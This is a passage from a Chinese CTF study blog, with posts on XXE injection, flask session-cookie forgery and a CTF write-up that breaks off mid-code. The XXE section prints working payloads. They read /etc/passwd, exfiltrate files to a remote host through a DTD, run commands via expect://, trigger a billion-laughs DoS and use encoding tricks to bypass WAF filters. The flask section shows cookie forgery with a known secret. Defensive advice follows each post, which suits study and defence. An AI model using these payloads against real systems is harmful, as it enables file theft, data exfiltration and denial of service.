versinotallow=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE ANY [</span><br><span class="line">                &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">        &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>引入外部DTD文档</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml versinotallow=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;</span><br><span class="line">        &lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br><span class="line"> </span><br><span class="line">evil.dtd内容：</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">//当然也可用参数实体</span><br></pre></td></tr></table></figure></li></ul><p><strong>无回显</strong>：</p><p><strong>利用参数实体：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>原理：连续调用了三个参数实体 %remote;%int;%send;，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p></blockquote><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a><strong>内网探测</strong></h4><p><strong>利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢</strong></p><p>探测22号端口是否开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;http://127.0.0.1.22&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><p><strong>利用xxe漏洞可以调用except:&#x2F;&#x2F;伪协议调用系统命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;expect://id&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h4 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a><strong>DDOS攻击</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</strong></p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="文档中的额外空格"><a href="#文档中的额外空格" class="headerlink" title="文档中的额外空格"></a><strong>文档中的额外空格</strong></h4><p>由于XXE通常在XML文档的开头，所以一些WAF为了避免处理整个文档，而<strong>只解析它的开头</strong>。但是，XML格式允许在格式化标记</p><p>属性时使用任意数量的空格，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格，从而绕过此类WAF。</p><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/3549773-20241104201102341-1259290345.png"></p><h4 id="过滤SYSTEM-PUBLIC关键字"><a href="#过滤SYSTEM-PUBLIC关键字" class="headerlink" title="过滤SYSTEM,PUBLIC关键字"></a>过滤SYSTEM,PUBLIC关键字</h4><h5 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a><strong>字符编码绕过</strong></h5><p>一个xml文档不仅可以用UTF-8编码，也可以用<strong>UTF-16(两个变体 - BE和LE)<strong>、</strong>UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码</strong>。</p><p>而通过这些编码可以很容易地绕过WAF，因为通常正则表达式仅配置为但字符集。</p><p><strong>UTF-16BE编码绕过关键字</strong>：</p><p>构造poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file://etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;feedback&gt;&amp;xxe;&lt;/feedback&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>然后保存为xml文件：</p><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/QQ20250302-204043.png"></p><p>再转为<strong>UTF-16BE编码</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> xxe.xml|iconv -f utf-8 -t utf-16be &gt;xxe.8-16be.xml</span><br></pre></td></tr></table></figure><blockquote><p><code>iconv -f utf-8 -t utf-16be</code>：<code>-f utf-8</code> 指定输入文件的编码格式是 UTF-8。 <code>-t utf-16be</code> 指定输出文件的编码格式是 UTF-16BE（大端字节序）。</p></blockquote><p>发送：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://ip/ -H <span class="string">&quot;Content-Type:application/xml;charset=UTF-16BE&quot;</span> --data-binary @xxe.8-16be.xml</span><br></pre></td></tr></table></figure><blockquote><p>发送一个POST 请求，将 xxe.8-16be.xml 文件的内容以 UTF-16BE 编码格式通过 POST 请求发送到指定的 URL。</p></blockquote><h5 id="双重实体编码（html）绕过"><a href="#双重实体编码（html）绕过" class="headerlink" title="双重实体编码（html）绕过"></a>双重实体编码（html）绕过</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="string">&#x27;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;&#x27;</span></span><br><span class="line">escaped_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&amp;#<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>;&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_str)</span><br><span class="line"><span class="built_in">print</span>(escaped_str)</span><br><span class="line"></span><br><span class="line">//&amp;<span class="comment">#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#34;&amp;#32;&amp;#62;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % a &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#34;&amp;#32;&amp;#62;&quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">//&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;</span><br></pre></td></tr></table></figure><p>这样我们转义后就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % a &quot;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><blockquote><p>当 XML 解析器遇到 <code>%a;</code> 时，会将其替换为参数实体 <code>a</code> 的值，也就是 <code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &quot;&gt;</code></p></blockquote><h4 id="过滤http"><a href="#过滤http" class="headerlink" title="过滤http"></a>过滤http</h4><p><strong>可以使用其他协议绕过，比如data:&#x2F;&#x2F;协议、file:&#x2F;&#x2F;协议加文件上传、php:&#x2F;&#x2F;filter协议加文件上传</strong></p><p>file:&#x2F;&#x2F;协议加文件上传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;filter协议加文件上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">    &lt;test&gt;</span><br><span class="line">        &amp;hhh;</span><br><span class="line">    &lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">    &lt;test&gt;</span><br><span class="line">        &amp;hhh;</span><br><span class="line">    &lt;/test&gt;</span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul><li><p><strong>禁用外部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">java:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">python:</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p><strong>过滤和验证用户提交的XML数据</strong></p></li><li><p><strong>不允许XML中含有任何自己声明的DTD ,过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</strong></p></li><li><p><strong>有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> Web </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> XXE </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask session伪造</title>
      <link href="/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="session机制"><a href="#session机制" class="headerlink" title="session机制"></a>session机制</h2><p>由于<strong>HTTP本身是一种无状态的协议</strong>,意味着用户向我们的应用提供了用户名和密码来进行用户认证，认证通过后<strong>HTTP协议不会记录下认证后的状态</strong>，那么下一次请求时，用户还要再一次进行认证，因为根据HTTP协议，我们并不知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在用户首次登录成功后，在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这是传统的基于session认证的过程</p><p><img src="/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/image-20240328144447173.png" alt="image-20240328144447173"></p><h2 id="flask-session存储方式"><a href="#flask-session存储方式" class="headerlink" title="flask session存储方式"></a>flask session存储方式</h2><p>分为两种：</p><ul><li><strong>直接存储在客户端的cookies中，而这样会产生一定的安全问题</strong></li><li><strong>存储在服务端，如：redis,memcached,mysql等等</strong></li></ul><h2 id="flask-session的工作原理"><a href="#flask-session的工作原理" class="headerlink" title="flask session的工作原理"></a>flask session的工作原理</h2><p>会话数据主要通过flask序列化为json并签名后存储在客户端的cookie中，而当用户每次请求时，flask会验证客户端发送的cookie的签名是否与服务器的<code>SECRET_KEY</code>匹配。如果签名无效，则会被丢弃。</p><h2 id="flask的session格式"><a href="#flask的session格式" class="headerlink" title="flask的session格式"></a>flask的session格式</h2><p>flask的session格式一般是由base64加密的session数据（经过了json、zlib压缩处理的字符串）、时间戳、签名组成的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">session数据                                     时间戳       签名               </span><br></pre></td></tr></table></figure><p><strong>时间戳</strong>：用来告诉服务端数据最后一次更新的时间，超过31天的会话将会过期，变为无效会话。</p><p><strong>签名</strong>：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>SECRET_KEY</code>加密而成的，用来保证数据没有被修改。</p><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>上面我们说到flask session是利用hmac算法将session数据、时间戳加上<code>SECRET_KEY</code>签名形成的，那么我们要进行session伪造就需要得到密钥<code>SECRET_KEY</code>，如果知道secret_key我们就可以轻松进行session伪造。</p><p><strong>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a></strong></p><p>工具利用：</p><ul><li><p><strong>kali安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/noraj/flask-session-cookie-manager.git &amp;&amp; <span class="built_in">cd</span> flask-session-cookie-manager</span><br></pre></td></tr></table></figure></li><li><p><strong>解码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27; -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span><br><span class="line"></span><br><span class="line">&#123;u&#x27;username&#x27;: &#x27;admin&#x27;, u&#x27;number&#x27;: &#x27;326410031505&#x27;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>-c：session数据</p><p>-s：密钥secret_key</p></blockquote></li><li><p><strong>编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27; -t &#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure></li></ul><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul><li><p><strong>保护 SECRET_KEY</strong></p><ul><li><p>避免硬编码在代码中，使用环境变量注入。</p></li><li><p>禁止通过 Git 等版本控制泄露。</p></li><li><p>定期更换密钥，使历史 Session 失效。</p></li></ul></li><li><p><strong>服务端存储</strong></p><p>使用 <code>Flask-Session</code> 扩展将会话数据存储于服务端，避免客户端篡改。</p></li><li><p><strong>HTTPS 传输</strong></p><p>防止 Cookie 在传输过程中被窃取（启用 <code>Secure</code> 和 <code>HttpOnly</code> 属性）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 2025元旦渗透赛复现</title>
      <link href="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h3><h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>任务应援包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>给了一张图片，但需要密码</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-190341.png"></p><p><strong>ARCHPR</strong>爆破：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-190643.png"></p><p><code>FLAG1：ctfshow&#123;654321&#125;</code></p><h4 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h4><p>要求我们找到<strong>任务中心的地址</strong></p><p>用winhex打开我们的图片：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-191053.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2VjcmV0TWVzc2FnZVJlc3BvbnNlCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgaW1wb3J0IHBpcAogICAgICAgIHBpcC5tYWluKFsnaW5zdGFsbCcsICdzZWNyZXRNZXNzYWdlUmVzcG9uc2UnXSkKICAgICAgICBmcm9tIHNlY3JldE1lc3NhZ2VSZXNwb25zZSBpbXBvcnQgcHJpbnRNZXNzYWdl</span><br></pre></td></tr></table></figure><p>base64解码：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-191145.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 